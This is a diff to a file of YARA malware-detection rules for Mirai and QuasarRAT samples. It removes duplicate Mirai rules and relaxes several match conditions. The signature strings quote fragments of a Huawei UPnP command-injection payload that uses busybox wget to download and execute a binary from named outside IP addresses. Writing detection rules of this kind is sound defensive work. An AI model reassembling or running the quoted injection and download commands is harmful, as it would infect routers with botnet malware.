@@ -110,25 +110,7 @@ rule Mirai_signature__f5a5c121 {
       $s11 = "Content-Length: 227" fullword ascii /* score: '9.00'*/
    condition:
       uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
-}
-
-rule Mirai_signature__e803f313 {
-   meta:
-      description = "_subset_batch - file Mirai(signature)_e803f313.elf"
-      author = "Metin Yigit"
-      reference = "internal"
-      date = "2025-09-10"
-      hash1 = "e803f313d93366fab2fd9002b059ed150aa1cccb9fc4a7d704a0174bc2e1cc7e"
-   strings:
-      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
-      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /resgod.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDownlo" ascii /* score: '20.00'*/
-      $s3 = "adURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
-      $s4 = "htndhfg" fullword ascii /* score: '8.00'*/
-      $s5 = "fddldlfb" fullword ascii /* score: '8.00'*/
-   condition:
-      uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
+      1 of ($x*) and 5 of them
 }
 
 rule Mirai_signature__ea586c8c {
@@ -185,7 +167,7 @@ rule Mirai_signature__ef582ff9 {
       $s4 = "kworker" fullword ascii /* score: '8.00'*/
    condition:
       uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
+      1 of ($x*) and 2 of them
 }
 
 rule Mirai_signature__ea262400 {
@@ -247,42 +229,6 @@ rule Mirai_signature__fbd136f0 {
    condition:
       uint16(0) == 0x457f and filesize < 300KB and
       all of them
-}
-
-rule Mirai_signature__e8932821 {
-   meta:
-      description = "_subset_batch - file Mirai(signature)_e8932821.elf"
-      author = "Metin Yigit"
-      reference = "internal"
-      date = "2025-09-10"
-      hash1 = "e89328219e412a061745f826ee6ad9be1a56ea91de224f3178a93b63375604b9"
-   strings:
-      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
-      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /resgod.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDownlo" ascii /* score: '20.00'*/
-      $s3 = "adURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
-      $s4 = "htndhfg" fullword ascii /* score: '8.00'*/
-      $s5 = "fddldlfb" fullword ascii /* score: '8.00'*/
-   condition:
-      uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
-}
-
-rule Mirai_signature__f6d51273 {
-   meta:
-      description = "_subset_batch - file Mirai(signature)_f6d51273.elf"
-      author = "Metin Yigit"
-      reference = "internal"
-      date = "2025-09-10"
-      hash1 = "f6d512731701decf6d190664168ba078b7fafa2455a0ea8be00d6a94ad1c5b74"
-   strings:
-      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
-      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /resgod.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDownlo" ascii /* score: '20.00'*/
-      $s3 = "adURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
-      $s4 = "htndhfg" fullword ascii /* score: '8.00'*/
-      $s5 = "fddldlfb" fullword ascii /* score: '8.00'*/
-   condition:
-      uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
 }
 
 rule Mirai_signature__f68a6165 {
@@ -458,56 +404,9 @@ rule Mirai_signature__eb1f8582 {
       $s4 = "kworker" fullword ascii /* score: '8.00'*/
    condition:
       uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
+      1 of ($x*) and 2 of them
 }
 
-rule Mirai_signature__f39296b2 {
-   meta:
-      description = "_subset_batch - file Mirai(signature)_f39296b2.elf"
-      author = "Metin Yigit"
-      reference = "internal"
-      date = "2025-09-10"
-      hash1 = "f39296b2e9a84e9c9c7875560edc271ca3baf8cdb58eccba0f679ab197c5df4d"
-   strings:
-      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
-      $s2 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
-      $s3 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
-   condition:
-      uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
-}
-
-rule Mirai_signature__f5fb1332 {
-   meta:
-      description = "_subset_batch - file Mirai(signature)_f5fb1332.elf"
-      author = "Metin Yigit"
-      reference = "internal"
-      date = "2025-09-10"
-      hash1 = "f5fb133297a6b13a5747610284b869759fa13310c27b6500758d584fec0a7dd3"
-   strings:
-      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
-      $s2 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
-      $s3 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
-   condition:
-      uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
-}
-
-rule Mirai_signature__fab6897b {
-   meta:
-      description = "_subset_batch - file Mirai(signature)_fab6897b.elf"
-      author = "Metin Yigit"
-      reference = "internal"
-      date = "2025-09-10"
-      hash1 = "fab6897bbd500129326b544e48e6e00d2ff72428548a3cec34e14833b6095e11"
-   strings:
-      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
-      $s2 = " -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloa" ascii /* score: '23.00'*/
-      $s3 = "dURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
-   condition:
-      uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
-}
 
 rule Mirai_signature__f29eec20 {
    meta:
@@ -616,25 +515,6 @@ rule Mirai_signature__e7f80d92 {
    condition:
       uint16(0) == 0x457f and filesize < 300KB and
       8 of them
-}
-
-rule Mirai_signature__e06ada70 {
-   meta:
-      description = "_subset_batch - file Mirai(signature)_e06ada70.elf"
-      author = "Metin Yigit"
-      reference = "internal"
-      date = "2025-09-10"
-      hash1 = "e06ada701a704de541fdc0c2732eb3182f58bb716270ae69ad804fbb8e7887ef"
-   strings:
-      $x1 = ",N^Nu<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas." ascii /* score: '40.00'*/
-      $s2 = " wget -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDo" ascii /* score: '28.00'*/
-      $s3 = "ap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busy" ascii /* score: '13.00'*/
-      $s4 = "wnloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
-      $s5 = ",N^Nu<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas." ascii /* score: '10.00'*/
-      $s6 = "kworker" fullword ascii /* score: '8.00'*/
-   condition:
-      uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
 }
 
 rule Mirai_signature__e7aee513 {
@@ -1323,7 +1203,7 @@ rule Mirai_signature__e6b0792c {
       $s4 = "Content-Length: 430" fullword ascii /* score: '9.00'*/
    condition:
       uint16(0) == 0x457f and filesize < 200KB and
-      1 of ($x*) and all of them
+      1 of ($x*) and $s2
 }
 
 rule Mirai_signature__e2025ce6 {
@@ -3723,7 +3603,7 @@ rule QuasarRAT_signature__6dbb22d7 {
       $s15 = "echo TgBoAFkATABGADIAaQBLAEUAcQBvAGEALwBIAFkANwB4AFkAUgAyAFkAVwBxAHkAbwBwAEMAVQBjAFIAUgBkADIARAB5AGUAWQAyAG4AWAA3ADYANwBRAFIANQB" ascii /* score: '23.00'*/
    condition:
       uint16(0) == 0x6540 and filesize < 6000KB and
-      1 of ($x*) and all of them
+      1 of ($x*) and 8 of them
 }
 
 rule NetSupport_signature_ {
